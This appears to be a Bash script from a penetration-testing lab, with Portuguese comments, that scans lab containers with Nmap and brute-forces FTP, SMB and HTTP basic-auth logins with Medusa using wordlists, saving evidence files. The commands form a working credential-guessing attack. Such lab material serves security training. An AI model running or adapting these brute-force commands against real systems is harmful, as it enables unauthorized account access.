#!/usr/bin/env bash
# Executa os ataques de brute force com a Medusa a partir do container atacante
# (lab-attacker) contra os alvos do laboratório, salvando as saídas em ../images/.
#
# Pré-requisito: ./lab-up.sh e o perfil 'attacker' ativo:
#   docker compose -p medusa-lab --profile attacker up -d
#
# Uso exclusivo em ambiente autorizado e controlado.
set -euo pipefail
cd "$(dirname "$0")"

OUT="../images"
A="lab-attacker"

echo "[*] Instalando Medusa e Nmap no atacante (se necessário)..."
docker exec "$A" bash -c "command -v medusa >/dev/null 2>&1 || (apt-get update -qq && DEBIAN_FRONTEND=noninteractive apt-get install -y -qq medusa nmap >/dev/null 2>&1)"

echo "[*] Copiando wordlists para o atacante..."
docker exec "$A" mkdir -p /root/wordlists
docker cp ../wordlists/usuarios.txt "$A":/root/wordlists/usuarios.txt
docker cp ../wordlists/senhas.txt  "$A":/root/wordlists/senhas.txt

echo "[*] Reconhecimento com Nmap..."
docker exec "$A" bash -c "nmap -Pn -sV -p 21,80,139,445 lab-ftp lab-smb lab-web lab-dvwa" | tee "$OUT/00-nmap.txt"

echo "[*] Brute force FTP..."
docker exec "$A" medusa -h lab-ftp -U /root/wordlists/usuarios.txt -P /root/wordlists/senhas.txt -M ftp   -t 4 -f | tee "$OUT/01-ftp-medusa.txt"

echo "[*] Brute force SMB..."
docker exec "$A" medusa -h lab-smb -U /root/wordlists/usuarios.txt -P /root/wordlists/senhas.txt -M smbnt -t 2 -f | tee "$OUT/02-smb-medusa.txt"

echo "[*] Brute force Web (autenticação básica HTTP)..."
docker exec "$A" medusa -h lab-web -U /root/wordlists/usuarios.txt -P /root/wordlists/senhas.txt -M http -m DIR:/ -t 4 -f | tee "$OUT/03-web-http-medusa.txt"

echo "[+] Concluído. Evidências salvas em $OUT/"
grep -h "ACCOUNT FOUND" "$OUT"/*.txt || true
